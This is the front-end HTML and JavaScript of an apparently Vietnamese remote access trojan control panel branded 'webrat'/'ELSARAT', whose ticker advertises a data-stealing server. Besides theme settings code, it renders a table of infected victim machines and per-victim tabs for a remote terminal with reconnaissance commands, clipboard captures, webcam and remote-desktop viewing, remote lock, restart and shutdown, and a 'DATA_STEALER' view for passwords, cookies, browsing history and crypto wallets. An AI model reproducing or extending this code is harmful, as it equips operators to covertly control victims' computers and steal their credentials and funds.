    </div>
    <div class="sg">
      <label>BACKGROUND OPACITY</label>
      <div class="opacity-row">
        <input type="range" class="slider" id="opacitySlider" min="0" max="100" value="92" style="--v:92%" oninput="setOpacity(this.value)" />
        <span class="sval" id="opacityVal">92%</span>
      </div>
    </div>
    <div class="sg">
      <label>BACKGROUND IMAGE</label>
      <div class="upload-area" onclick="document.getElementById('bgFile').click()">
        <span>▲ CLICK TO UPLOAD IMAGE</span>
        <input type="file" id="bgFile" accept="image/*" style="display:none" onchange="loadBg(this)" />
      </div>
      <img id="bg-preview-img" alt="preview" />
      <button class="rm-btn" id="rmBgBtn" onclick="removeBg()">✕ REMOVE BACKGROUND</button>
    </div>
    <div class="sg" style="border:1px solid color-mix(in srgb,var(--accent) 20%,transparent);border-radius:8px;padding:10px 14px;background:color-mix(in srgb,var(--accent) 4%,transparent);">
      <div style="font-size:9px;letter-spacing:1.5px;color:var(--accent);margin-bottom:6px;">TÀI KHOẢN</div>
      <a href="profile.php" style="display:flex;align-items:center;gap:8px;text-decoration:none;color:#ccc;font-size:10px;letter-spacing:1px;transition:color .2s;" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='#ccc'">
        <span style="font-size:14px;">👤</span>
        <span>XEM / CHỈNH SỬA HỒ SƠ</span>
        <span style="margin-left:auto;font-size:11px;opacity:.5;">→</span>
      </a>
      <div style="height:1px;background:rgba(255,255,255,.06);margin:8px 0;"></div>
      <form method="POST" style="margin:0;padding:0;">
        <input type="hidden" name="action" value="logout" />
        <button type="submit" style="display:flex;align-items:center;gap:8px;width:100%;background:none;border:none;cursor:pointer;color:#f55;font-size:10px;letter-spacing:1px;padding:0;font-family:inherit;transition:color .2s;" onmouseover="this.style.color='#ff7070'" onmouseout="this.style.color='#f55'">
          <span style="font-size:14px;">⏻</span>
          <span>ĐĂNG XUẤT</span>
        </button>
      </form>
    </div>
  </div>
</div>

<script>
// ─── DEVICE DETECTION ───────────────────────────────────
const IS_MOBILE = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  || window.innerWidth < 768;

const deviceBadge = document.getElementById('deviceBadge');
if (deviceBadge) {
  deviceBadge.textContent = IS_MOBILE ? '📱 MOBILE' : '🖥 PC';
}

// Apply mobile layout to client panel
function applyMobileLayout() {
  const panel = document.getElementById('clientPanel');
  if (IS_MOBILE && panel) {
    panel.classList.add('mobile-cp-mode');
  }
}
applyMobileLayout();

// ─── DATA ───────────────────────────────────────────────
let CLIENTS = [];

const TABS = [
  {id:'info',      icon:'ⓘ', label:'Info'},
  {id:'terminal',  icon:'$', label:'Terminal'},
  {id:'files',     icon:'⊟', label:'Files'},
  {id:'remote',    icon:'▷', label:'Remote'},
  {id:'roll',      icon:'↺', label:'Roll'},
  {id:'webcam',    icon:'⊡', label:'Webcam'},
  {id:'tasks',     icon:'☰', label:'Tasks'},
  {id:'code',      icon:'</', label:'Code'},
  {id:'stealer',   icon:'◈', label:'Stealer'},
  {id:'clipboard', icon:'⎘', label:'Clipboard'},
  {id:'comms',     icon:'✉', label:'Comms'},
  {id:'proxy',     icon:'⇌', label:'Proxy'},
];

const TICKER_ITEMS = [
  {t:'♐ ELSARAT',w:false},
  {t:'⚠ SEVER ĐÁNH CẤP DỮ LIỆU',w:false},
  {t:'🎅 HOÀNG CHẢ SAN BẰNG TẤT CẢ',w:true},
  {t:'⚠ SEVER RAT MẠNH NHẤT VN',w:false},
  {t:'⚠ CHAN BỐ MÀY ĐI',w:false},
  {t:'🤶 TRẦN ANH KHOA ĐÈ HẾT TẤT CẢ',w:true},
];

const PRESETS = ['#ff0090','#00aaff','#ff6600','#aa00ff','#ffcc00','#ff3333','#00ff44','#00ffff','rainbow'];

// ─── UTILS ──────────────────────────────────────────────
function escapeHtml(str) {
  if (str === null || str === undefined) return '';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;');
}

function fmtSize(bytes) {
  if (!bytes || bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
  return (bytes/1048576).toFixed(1) + ' MB';
}

// ─── SETTINGS ───────────────────────────────────────────
const SETTINGS_KEY = 'webrat_settings';
function loadSettings() { try { return JSON.parse(localStorage.getItem(SETTINGS_KEY)||'{}'); } catch { return {}; } }
function saveSettings(patch) {
  try {
    const cur = loadSettings(), next = Object.assign({}, cur);
    for (const [k,v] of Object.entries(patch)) { if (v===null||v===undefined) delete next[k]; else next[k]=v; }
    localStorage.setItem(SETTINGS_KEY, JSON.stringify(next));
  } catch {}
}

// ─── RAINBOW MODE ────────────────────────────────────────
let rainbowTimer = null;
let rainbowHue = 0;
function startRainbow() {
  stopRainbow();
  rainbowHue = 0;
  rainbowTimer = setInterval(function() {
    rainbowHue = (rainbowHue + 1) % 360;
    const h = rainbowHue;
    const color = hslToHex(h, 100, 55);
    document.documentElement.style.setProperty('--accent', color);
    document.documentElement.style.setProperty('--glow', color + '66');
    const hi = document.getElementById('hexInput');
    const cp = document.getElementById('colorPicker');
    if (hi) hi.value = color;
    if (cp) cp.value = color;
    const rli = document.getElementById('logoImg');
    if (rli) rli.style.filter = hexToLogoFilter(color);
  }, 30);
  document.querySelectorAll('.pdot').forEach(d => d.classList.remove('active'));
  const rb = document.querySelector('.pdot.rainbow-dot');
  if (rb) rb.classList.add('active');
  saveSettings({rainbow:true, accent:null});
}
function stopRainbow() {
  if (rainbowTimer) { clearInterval(rainbowTimer); rainbowTimer = null; }
  const rb = document.querySelector('.pdot.rainbow-dot');
  if (rb) rb.classList.remove('active');
}
function hslToHex(h, s, l) {
  s /= 100; l /= 100;
  const a = s * Math.min(l, 1 - l);
  const f = n => { const k = (n + h / 30) % 12; const c = l - a * Math.max(Math.min(k - 3, 9 - k, 1), -1); return Math.round(255 * c).toString(16).padStart(2, '0'); };
  return '#' + f(0) + f(8) + f(4);
}

function applyStoredSettings() {
  const s = loadSettings();
  if (s.rainbow) { startRainbow(); return; }
  if (s.accent) { setAccentRaw(s.accent); const cp=document.getElementById('colorPicker'),hi=document.getElementById('hexInput'); if(cp)cp.value=s.accent; if(hi)hi.value=s.accent; }
  if (s.opacity !== undefined) { const val=Number(s.opacity); setOpacityRaw(val); const sl=document.getElementById('opacitySlider'),ov=document.getElementById('opacityVal'); if(sl){sl.value=val;sl.style.setProperty('--v',val+'%');} if(ov)ov.textContent=val+'%'; }
  if (s.bgImage) { const bg=document.getElementById('bg-layer'); if(bg)bg.style.backgroundImage=`url(${s.bgImage})`; const prev=document.getElementById('bg-preview-img'),rmBtn=document.getElementById('rmBgBtn'),us=document.querySelector('.upload-area span'); if(prev){prev.src=s.bgImage;prev.style.display='block';} if(rmBtn)rmBtn.style.display='block'; if(us)us.textContent='✓ IMAGE LOADED'; detectBgBrightness(s.bgImage); }
  if (s.bgGradient) { const bg=document.getElementById('bg-layer'); if(bg){bg.style.backgroundImage=s.bgGradient;bg.style.backgroundColor=s.bgColor||'#08050c';} }
  // Profile is loaded from server separately (loadProfileFromServer)
}

function hexToLogoFilter(hex) {
  if(!/^#[0-9A-Fa-f]{6}$/.test(hex)) return `brightness(0) invert(1) drop-shadow(0 0 8px ${hex}99)`;
  const r=parseInt(hex.slice(1,3),16)/255, g=parseInt(hex.slice(3,5),16)/255, b=parseInt(hex.slice(5,7),16)/255;
  const max=Math.max(r,g,b), min=Math.min(r,g,b), d=max-min;
  let h=0;
  if(d>0){
    if(max===r) h=(((g-b)/d)%6)*60;
    else if(max===g) h=((b-r)/d+2)*60;
    else h=((r-g)/d+4)*60;
    if(h<0) h+=360;
  }
  const l=(max+min)/2;
  const s=d===0?0:d/(1-Math.abs(2*l-1));
  const br=Math.max(0.6, l*1.8).toFixed(2);
  const sat=Math.round(s*600);
  const hueShift=Math.round(h-30);
  return `brightness(0) invert(1) sepia(1) saturate(${sat}%) hue-rotate(${hueShift}deg) brightness(${br}) drop-shadow(0 0 10px ${hex}aa)`;
}
function setAccentRaw(color) {
  stopRainbow();
  document.documentElement.style.setProperty('--accent', color);
  document.documentElement.style.setProperty('--glow', color+'66');
  document.querySelectorAll('.pdot').forEach(d=>d.classList.toggle('active', d.title.toLowerCase()===color.toLowerCase()));
  const logoImg = document.getElementById('logoImg');
  if (logoImg) logoImg.style.filter = hexToLogoFilter(color);
}
function setOpacityRaw(val) { document.documentElement.style.setProperty('--bg-alpha', (val/100).toFixed(2)); }

// ─── BACKGROUND BRIGHTNESS DETECTION ────────────────────
function detectBgBrightness(dataUrl) {
  const img = new Image();
  img.crossOrigin = 'anonymous';
  img.onload = function() {
    try {
      const SIZE = 80;
      const canvas = document.createElement('canvas');
      canvas.width = SIZE; canvas.height = SIZE;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, SIZE, SIZE);
      const data = ctx.getImageData(0, 0, SIZE, SIZE).data;
      let total = 0, count = 0;
      // Sample every 4th pixel for speed
      for (let i = 0; i < data.length; i += 16) {
        // Perceived brightness (ITU-R 601)
        total += 0.299 * data[i] + 0.587 * data[i+1] + 0.114 * data[i+2];
        count++;
      }
      const avg = count > 0 ? total / count : 0;
      setThemeMode(avg > 140 ? 'light' : 'dark');
    } catch(e) {
      setThemeMode('dark'); // fallback nếu canvas bị chặn (CORS)
    }
  };
  img.onerror = function() { setThemeMode('dark'); };
  img.src = dataUrl;
}

function setThemeMode(mode) {
  const html = document.documentElement;
  const badge = document.getElementById('themeBadge');
  if (mode === 'light') {
    html.setAttribute('data-theme', 'light');
    if (badge) { badge.textContent = '☀ LIGHT BG'; badge.classList.add('visible'); }
  } else {
    html.removeAttribute('data-theme');
    if (badge) { badge.textContent = '🌙 DARK BG'; badge.classList.add('visible'); }
  }
  // Ẩn badge sau 2.5s
  if (badge) { clearTimeout(badge._t); badge._t = setTimeout(() => badge.classList.remove('visible'), 2500); }
}
function setAccent(color) {
  setAccentRaw(color);
  const hi=document.getElementById('hexInput');
  if(hi)hi.value=color;
  saveSettings({accent:color, rainbow:null});
}
function hexChange(val) { if(/^#[0-9A-Fa-f]{6}$/.test(val)){ setAccent(val); const cp=document.getElementById('colorPicker'); if(cp)cp.value=val; } }
function toggleSettings() { const p=document.getElementById('settingsPanel'),b=document.getElementById('settingsBackdrop'); if(p&&b){p.classList.toggle('open');b.classList.toggle('open');} }

function setOpacity(val) {
  setOpacityRaw(val);
  const ov=document.getElementById('opacityVal'),sl=document.getElementById('opacitySlider');
  if(ov)ov.textContent=val+'%'; if(sl)sl.style.setProperty('--v',val+'%');
  saveSettings({opacity:String(val)});
}
function loadBg(input) {
  const file=input.files[0]; if(!file)return;
  const reader=new FileReader();
  reader.onload=function(e){
    const data=e.target.result;
    const bg=document.getElementById('bg-layer'); if(bg)bg.style.backgroundImage=`url(${data})`;
    const prev=document.getElementById('bg-preview-img'),rmBtn=document.getElementById('rmBgBtn'),us=document.querySelector('.upload-area span');
    if(prev){prev.src=data;prev.style.display='block';} if(rmBtn)rmBtn.style.display='block'; if(us)us.textContent='✓ IMAGE LOADED';
    saveSettings({bgImage:data,bgGradient:null,bgColor:null});
    detectBgBrightness(data); // ← tự nhận diện sáng/tối
  };
  reader.readAsDataURL(file);
}
function removeBg() {
  const bg=document.getElementById('bg-layer'); if(bg){bg.style.backgroundImage='';bg.style.backgroundColor='#08050c';}
  const prev=document.getElementById('bg-preview-img'),rmBtn=document.getElementById('rmBgBtn'),bgFile=document.getElementById('bgFile'),us=document.querySelector('.upload-area span');
  if(prev)prev.style.display='none'; if(rmBtn)rmBtn.style.display='none'; if(bgFile)bgFile.value=''; if(us)us.textContent='▲ CLICK TO UPLOAD IMAGE';
  saveSettings({bgImage:null,bgGradient:null,bgColor:null});
  setThemeMode('dark'); // ← reset về dark khi xoá bg
}

// ─── PROFILE (server-side per account) ───────────────────
// Cache current user's profile in memory so renderChatMsg can use it instantly
let MY_PROFILE = { nickname: null, avatar: null };

function applyHeaderProfile(nickname, avatar) {
  const nameEl   = document.getElementById('headerUsername');
  const avWrap   = document.getElementById('headerAvatarWrap');
  const avImg    = document.getElementById('headerAvatar');
  if (nameEl && nickname) nameEl.textContent = nickname;
  if (avatar && avWrap && avImg) {
    avImg.src = avatar;
    avWrap.style.display = 'inline-block';
    // Ẩn text username khi đã có avatar để không bị tràn nav
    if (nameEl) nameEl.style.display = 'none';
  }
}

async function loadProfileFromServer() {
  try {
    const res = await fetch('api.php?action=get_profile');
    const json = await res.json();
    if (json.status === 'ok') {
      MY_PROFILE.nickname = json.data.nickname || null;
      MY_PROFILE.avatar   = json.data.avatar   || null;
      applyHeaderProfile(MY_PROFILE.nickname, MY_PROFILE.avatar);
    }
  } catch {}
}
// ─── PAGE NAV ────────────────────────────────────────────
function showPage(pageId) {
  const dash=document.getElementById('page-dashboard'),stats=document.getElementById('page-stats'),panel=document.getElementById('clientPanel');
  if(dash) dash.style.display = pageId==='dashboard'?'block':'none';
  if(stats) stats.style.display = pageId==='stats'?'block':'none';
  if(panel) panel.classList.remove('show');
  const nd=document.getElementById('nav-dash'),ns=document.getElementById('nav-stats');
  if(nd) nd.classList.toggle('active', pageId==='dashboard');
  if(ns) ns.classList.toggle('active', pageId==='stats');
}

// ─── TABLE ───────────────────────────────────────────────
function renderTable(clients) {
  const tbody = document.getElementById('tableBody');
  if (!tbody) return;
  if (!clients || clients.length === 0) {
    tbody.innerHTML = `<tr><td colspan="7" class="empty-state">[ NO CLIENTS FOUND — WAITING FOR CLIENT AGENT CHECKIN ]</td></tr>`;
    return;
  }
  tbody.innerHTML = clients.map(c => {
    const sc = c.status==='online'?'on':(c.status==='recent'?'rec':'away');
    return `<tr onclick="openPanel('${escapeHtml(c.id)}')">
      <td class="td-id">${escapeHtml(c.id)}</td>
      <td class="td-loc">${escapeHtml(c.loc||'—')}</td>
      <td class="td-user">${escapeHtml(c.user||'Unknown')}</td>
      <td class="td-pcname"><span class="pc-icon">🖥</span> ${escapeHtml(c.pcname||'PC')}</td>
      <td class="td-ip">${escapeHtml(c.ip||'—')}</td>
      <td><div class="ping-cell"><span class="dot ${sc}"></span> ${escapeHtml(c.ping||'now')}</div></td>
      <td class="td-active" title="${escapeHtml(c.active||'')}">${escapeHtml(c.active||'—')}</td>
    </tr>`;
  }).join('');
}

function filterTable() {
  const q=(document.getElementById('searchInput')?.value||'').toLowerCase().trim();
  if(!q){renderTable(CLIENTS);return;}
  renderTable(CLIENTS.filter(c=>
    (c.id&&c.id.toLowerCase().includes(q))||
    (c.user&&c.user.toLowerCase().includes(q))||
    (c.pcname&&c.pcname.toLowerCase().includes(q))||
    (c.ip&&c.ip.toLowerCase().includes(q))||
    (c.loc&&c.loc.toLowerCase().includes(q))||
    (c.active&&c.active.toLowerCase().includes(q))
  ));
}

// ─── STATS ───────────────────────────────────────────────
const sg = document.getElementById('statsGrid');
function renderStats(d) {
  if(!sg) return;
  const items = [
    {label:'ACTIVE_CLIENTS', val:String(d.online_clients||0), sub:'online now'},
    {label:'TOTAL_CLIENTS',  val:String(d.total_clients||0),  sub:'registered'},
    {label:'LOCATIONS',      val:String(d.locations_count||0), sub:(d.locations||[]).join(' / ')},
    {label:'SCREENSHOTS',    val:String(d.screenshots_today||0), sub:'today'},
    {label:'COMMANDS_SENT',  val:String(d.commands_today||0), sub:'today'},
  ];
  sg.innerHTML = items.map(s=>`<div class="stat-card"><div class="stat-label">${s.label}</div><div class="stat-val">${s.val}</div><div class="stat-sub">${s.sub||'&nbsp;'}</div></div>`).join('');
}

// ─── CLIENT PANEL ────────────────────────────────────────
let currentClient = null;
let activeTab = 'info';

function openPanel(clientId) {
  const client = CLIENTS.find(c=>c.id===clientId);
  if(!client) return;
  currentClient = client;

  document.getElementById('page-dashboard').style.display='none';
  document.getElementById('page-stats').style.display='none';
  document.getElementById('clientPanel').classList.add('show');

  const cpName=document.getElementById('cpName'),cpStatus=document.getElementById('cpStatus');
  if(cpName) cpName.textContent = client.id+' ('+client.user+')';
  if(cpStatus) cpStatus.textContent = (client.status||'away').toUpperCase();

  ['cpDot','cpDot2'].forEach(id=>{
    const el=document.getElementById(id);
    if(el) el.className='status-dot '+(client.status||'away');
  });

  renderSidebarNav();
  switchTab('info');
}

function closePanel() {
  document.getElementById('clientPanel').classList.remove('show');
  document.getElementById('page-dashboard').style.display='block';
  currentClient = null;
}

function renderSidebarNav() {
  const nav = document.getElementById('cpNav');
  if(!nav) return;
  nav.innerHTML = TABS.map(t=>`
    <button class="cp-tab ${t.id===activeTab?'active':''}" onclick="switchTab('${t.id}')">
      <span class="cp-tab-icon">${t.icon}</span>
      <span class="cp-tab-label">${t.label}</span>
      ${t.id==='clipboard'?`<span class="cp-dot"></span>`:''}
    </button>
  `).join('');
}

async function switchTab(tabId) {
  activeTab = tabId;
  renderSidebarNav();
  await renderTabContent(tabId);
}

// ─── TAB CONTENT RENDERER ────────────────────────────────
async function renderTabContent(tabId) {
  const content = document.getElementById('cpContent');
  if(!content || !currentClient) return;

  // ── INFO ──
  if (tabId==='info') {
    const onH = currentClient.onlineH||0, totH = currentClient.totalH||0;
    const pct = totH>0 ? Math.min(100,Math.round(onH/totH*100)) : 0;
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="sec-head"><div class="section-title"><span class="bracket">&gt;</span> SYSTEM_INFORMATION</div>
          <span class="tag ${currentClient.status==='online'?'tag-online':currentClient.status==='recent'?'tag-recent':'tag-away'}">${(currentClient.status||'away').toUpperCase()}</span>
        </div>
        <div class="info-box">
          <table class="info-table">
            <tr><td class="info-key">Location:</td><td class="info-val">${escapeHtml(currentClient.loc)||'—'}</td></tr>
            <tr><td class="info-key">ASN:</td><td class="info-val">${escapeHtml(currentClient.asn)||'—'}</td></tr>
            <tr><td class="info-key">Hosting:</td><td class="info-val">${currentClient.hosting?'<span style="color:#ff6600">true</span>':'<span style="color:#555">false</span>'}</td></tr>
            <tr><td class="info-key">Active window:</td><td class="info-val" style="color:var(--accent)">${escapeHtml(currentClient.active)||'—'}</td></tr>
            <tr><td class="info-key">System:</td><td class="info-val">${escapeHtml(currentClient.system)||'—'}</td></tr>
            <tr><td class="info-key">Last active:</td><td class="info-val">${escapeHtml(currentClient.lastActive)||'—'}</td></tr>
            <tr><td class="info-key">Debut:</td><td class="info-val">${escapeHtml(currentClient.debut)||'—'}</td></tr>
            <tr><td class="info-key">Admin rights:</td><td class="info-val">${currentClient.adminRights?'<span style="color:var(--accent)">true</span>':'<span style="color:#555">false</span>'}</td></tr>
            <tr><td class="info-key">CPU:</td><td class="info-val">${escapeHtml(currentClient.cpu)||'—'}</td></tr>
            <tr><td class="info-key">GPU:</td><td class="info-val">${escapeHtml(currentClient.gpu)||'—'}</td></tr>
            <tr><td class="info-key">Ram:</td><td class="info-val">${escapeHtml(currentClient.ram)||'—'}</td></tr>
            <tr><td class="info-key">Comment:</td><td class="info-val"><input class="comment-input" id="commentInput" placeholder="Add comment..." value="" onblur="saveComment(this.value)"/></td></tr>
          </table>
        </div>
        <div class="online-stats">
          <div class="stats-title">Online statistics</div>
          <div class="stats-bar-bg">
            <div class="stats-bar-offline" style="width:${100-pct}%"><span class="stats-bar-label">${totH-onH}h ${totH-onH>0?'offline':''}</span></div>
            <div class="stats-bar-online"  style="width:${pct}%"><span class="stats-bar-label">${onH}h</span></div>
          </div>
          <div class="stats-legend">
            <div class="legend-item"><div class="legend-dot offline-dot"></div> Offline: ${totH-onH}h</div>
            <div class="legend-item"><div class="legend-dot online-dot"></div> Online: ${onH}h</div>
          </div>
        </div>
        <div class="divider"></div>
        <div class="quick-tools-grid">
          <button class="tool-btn lg" onclick="switchTab('terminal')">$ Terminal</button>
          <button class="tool-btn lg" onclick="switchTab('files')">⊟ Files</button>
          <button class="tool-btn lg" onclick="switchTab('remote')">▷ Remote</button>
          <button class="tool-btn lg" onclick="switchTab('roll')">↺ Roll</button>
          <button class="tool-btn lg" onclick="switchTab('webcam')">⊡ Webcam</button>
          <button class="tool-btn lg" onclick="switchTab('tasks')">☰ Tasks</button>
          <button class="tool-btn lg" onclick="switchTab('code')"></ Code</button>
          <button class="tool-btn lg" onclick="switchTab('stealer')">◈ Stealer</button>
          <button class="tool-btn lg" onclick="switchTab('clipboard')">⎘ Clipboard</button>
          <button class="tool-btn lg" onclick="switchTab('comms')">✉ Comms</button>
          <button class="tool-btn lg" onclick="switchTab('proxy')">⇌ Proxy</button>
          <button class="tool-btn lg danger" onclick="if(confirm('Kill agent on '+currentClient.id+'?'))sendCommand(currentClient.id,'taskkill /f /im agent.exe')">✕ Kill Agent</button>
        </div>
      </div>`;

  // ── TERMINAL ──
  } else if (tabId==='terminal') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="sec-head"><div class="section-title"><span class="bracket">&gt;</span> REMOTE_TERMINAL</div>
          <button class="tool-btn sm" onclick="updateTerminalHistory()">↻</button>
        </div>
        <div class="terminal-wrap">
          <div class="term-out" id="termOut"><span class="loading-state">Loading...</span></div>
          <div class="term-input-row">
            <span class="term-prompt">&gt;</span>
            <input type="text" class="term-input" id="termInput" placeholder="cmd / powershell / bash..." onkeydown="if(event.key==='Enter')execCmd()" />
            <button class="tool-btn" onclick="execCmd()">SEND</button>
          </div>
        </div>
        <div class="remote-tools" style="margin-top:10px;">
          <button class="tool-btn sm" onclick="quickCmd('whoami')">whoami</button>
          <button class="tool-btn sm" onclick="quickCmd('ipconfig')">ipconfig</button>
          <button class="tool-btn sm" onclick="quickCmd('dir C:\\\\')">dir C:\\</button>
          <button class="tool-btn sm" onclick="quickCmd('systeminfo')">sysinfo</button>
          <button class="tool-btn sm" onclick="quickCmd('tasklist')">tasklist</button>
          <button class="tool-btn sm" onclick="quickCmd('net user')">net user</button>
        </div>
      </div>`;
    updateTerminalHistory();

  // ── CLIPBOARD ──
  } else if (tabId==='clipboard') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="keylog-header">
          <div class="section-title"><span class="bracket">&gt;</span> CLIPBOARD_CAPTURES</div>
          <button class="tool-btn sm" onclick="renderTabContent('clipboard')">↻</button>
        </div>
        <div id="clipBody"><div class="loading-state">Fetching clipboard data...</div></div>
      </div>`;
    const clips = await loadClipboards(currentClient.id);
    const clipBody = document.getElementById('clipBody');
    if(clipBody){
      if(!clips||clips.length===0){
        clipBody.innerHTML=`<div class="empty-state">NO CLIPBOARD DATA CAPTURED YET.</div>`;
      } else {
        clipBody.innerHTML = clips.map(c=>`
          <div class="clipboard-entry">
            <div class="kl-time">${escapeHtml(c.captured_at)}</div>
            <div class="clipboard-text">${escapeHtml(c.text)}</div>
          </div>`).join('');
      }
    }

  // ── REMOTE ──
  } else if (tabId==='remote') {
    const c = currentClient;
    const sysLine = [c.ip, c.system].filter(Boolean).join(' &mdash; ') || 'Unknown Host';
    content.innerHTML = `
      <div class="tab-pane active" style="padding:0;display:flex;flex-direction:column;height:100%;min-height:520px;">

        <!-- Screen viewer -->
        <div class="rd-screen" id="rdScreen" style="flex:1;min-height:340px;position:relative;background:#050308;border:1px solid #1a1a2e;border-bottom:none;display:flex;align-items:center;justify-content:center;overflow:hidden;">
          <div style="position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.06) 3px,rgba(0,0,0,.06) 4px);pointer-events:none;z-index:1;"></div>

          <!-- Idle state -->
          <div id="rdIdle" style="display:flex;flex-direction:column;align-items:center;gap:12px;padding:40px;text-align:center;z-index:2;">
            <div style="color:#2a2a3e;margin-bottom:6px;">
              <svg width="52" height="44" viewBox="0 0 52 44" fill="none">
                <rect x="1" y="1" width="50" height="34" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/>
                <rect x="19" y="35" width="14" height="5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                <line x1="12" y1="42" x2="40" y2="42" stroke="currentColor" stroke-width="1.5"/>
                <circle cx="26" cy="18" r="2" fill="currentColor"/>
              </svg>
            </div>
            <div style="font-size:15px;letter-spacing:4px;color:#ccc;">REMOTE DESKTOP</div>
            <div style="font-size:11px;letter-spacing:2px;color:#555;">${sysLine}</div>
            <button onclick="rdRequestScreenshot()" style="margin-top:8px;background:transparent;border:1px solid var(--accent);color:var(--accent);font-family:inherit;font-size:12px;letter-spacing:3px;padding:10px 28px;cursor:pointer;transition:all .2s;" onmouseover="this.style.boxShadow='0 0 18px var(--glow)'" onmouseout="this.style.boxShadow='none'">&#9654; CONNECT</button>
          </div>

          <!-- Live image / Canvas for high FPS -->
          <img id="rdLiveImg" style="display:none;max-width:100%;max-height:100%;object-fit:contain;z-index:2;" alt="Live Screen" />
          <canvas id="rdCanvas" style="display:none;max-width:100%;max-height:100%;object-fit:contain;z-index:2;"></canvas>
          <!-- TOP CONTROL BAR (RESPONSIVE FLEXBAR FOR MOBILE & PC) -->
          <div id="rdTopControlBar" style="position:absolute;top:10px;left:10px;display:flex;align-items:center;gap:6px;z-index:20;flex-wrap:wrap;max-width:calc(100% - 20px);">
            <select class="proxy-select" id="rdResSelect" onchange="rdChangeResolution(this.value)" style="padding:2px 6px;font-size:10px;height:auto;background:rgba(255,255,255,.05);">
                <option value="1920" selected style="background:#08050c;color:#fff;">1080p FHD (60 FPS)</option>
                <option value="1280" style="background:#08050c;color:#fff;">720p HD</option>
                <option value="1024" style="background:#08050c;color:#fff;">1024p</option>
                <option value="640" style="background:#08050c;color:#fff;">640p</option>
              </select>           <!-- LIVE BADGE -->
            <div id="rdLiveBadge" style="display:none;background:rgba(8,5,18,.9);border:1px solid #ff0044;color:#ff2255;font-size:10px;letter-spacing:1px;padding:3px 8px;white-space:nowrap;animation:rd-pulse 1.2s ease infinite;">&#9679; LIVE</div>
            
            <!-- FPS BADGE -->
            <div id="rdFpsBadge" style="display:none;background:rgba(8,5,18,.9);border:1px solid var(--accent);color:var(--accent);font-size:10px;letter-spacing:1px;padding:3px 8px;white-space:nowrap;">0 FPS</div>
            
            <!-- RESOLUTION SELECTOR BADGE -->
            <div id="rdResBadge" style="display:none;background:rgba(8,5,18,.9);border:1px solid var(--accent);color:var(--accent);font-size:10px;letter-spacing:1px;padding:2px 6px;align-items:center;white-space:nowrap;">
              <span style="color:#aaa;margin-right:4px;font-size:9px;">RES:</span>
              <select id="rdResSelect" onchange="rdChangeResolution(this.value)" style="background:#08050c;color:var(--accent);border:none;font-family:inherit;font-size:10px;outline:none;cursor:pointer;padding:0;">
                <option value="1280" selected style="background:#08050c;color:#fff;">1280p (Unlimited Max-Speed)</option>
                <option value="1024" style="background:#08050c;color:#fff;">1024p (HD)</option>
                <option value="800" style="background:#08050c;color:#fff;">800p</option>
                <option value="640" style="background:#08050c;color:#fff;">640p</option>
              </select>
            </div>
          </div>

          <!-- Toast Notification -->
          <div id="rdToast" style="display:none;position:absolute;top:10px;right:10px;background:rgba(8,5,18,.95);border:1px solid var(--accent);color:var(--accent);font-family:inherit;font-size:10px;letter-spacing:1px;padding:6px 10px;z-index:20;"></div>
        </div>

        <!-- Toolbar -->
        <div style="display:flex;border:1px solid #1a1a2e;border-top:none;background:rgba(0,0,0,.5);">
          <button onclick="rdRequestScreenshot()" style="flex:1;background:transparent;border:none;border-right:1px solid #1a1a2e;color:#777;font-family:inherit;font-size:11px;letter-spacing:2px;padding:13px 8px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'">
            &#9741; SCREENSHOT
          </button>
          <button id="rdAutoBtn" onclick="rdToggleAuto()" style="flex:1.3;background:transparent;border:none;border-right:1px solid #1a1a2e;color:#777;font-family:inherit;font-size:11px;letter-spacing:2px;padding:13px 8px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'">
            &#9654; AUTO OFF
          </button>

          <button onclick="rdQuickCmd('rundll32.exe user32.dll,LockWorkStation')" style="flex:1;background:transparent;border:none;border-right:1px solid #1a1a2e;color:#777;font-family:inherit;font-size:11px;letter-spacing:2px;padding:13px 8px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'">
            &#128274; LOCK
          </button>
          <button onclick="rdQuickCmd('shutdown /r /t 5')" style="flex:1;background:transparent;border:none;border-right:1px solid #1a1a2e;color:#777;font-family:inherit;font-size:11px;letter-spacing:2px;padding:13px 8px;cursor:pointer;transition:all .2s;" onmouseover="this.style.color='#ccc'" onmouseout="this.style.color='#777'">
            &#8635; RESTART
          </button>
          <button onclick="rdQuickCmd('shutdown /s /t 5')" style="flex:1;background:transparent;border:none;color:var(--accent);border:1px solid color-mix(in srgb, var(--accent) 35%, transparent);border-top:none;font-family:inherit;font-size:11px;letter-spacing:2px;padding:13px 8px;cursor:pointer;transition:all .2s;" onmouseover="this.style.background='color-mix(in srgb, var(--accent) 10%, transparent)'" onmouseout="this.style.background='transparent'">
            &#9211; SHUTDOWN
          </button>
        </div>
      </div>`;

    // Khoi dong polling neu dang auto
    if (window._rdAutoOn) rdStartPolling();
} else if (tabId==='stealer') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="section-title" style="margin-bottom:14px;"><span class="bracket">&gt;</span> DATA_STEALER</div>
        <div class="stealer-tabs">
          <button class="stealer-tab active" onclick="showStealerTab('passwords',this)">PASSWORDS</button>
          <button class="stealer-tab" onclick="showStealerTab('cookies',this)">COOKIES</button>
          <button class="stealer-tab" onclick="showStealerTab('history',this)">HISTORY</button>
          <button class="stealer-tab" onclick="showStealerTab('wallets',this)">WALLETS</button>
        </div>
        <div id="stealerContent">
          <div class="task-bar">
            <span style="color:#555;font-size:11px;">0 ENTRIES FOUND</span>
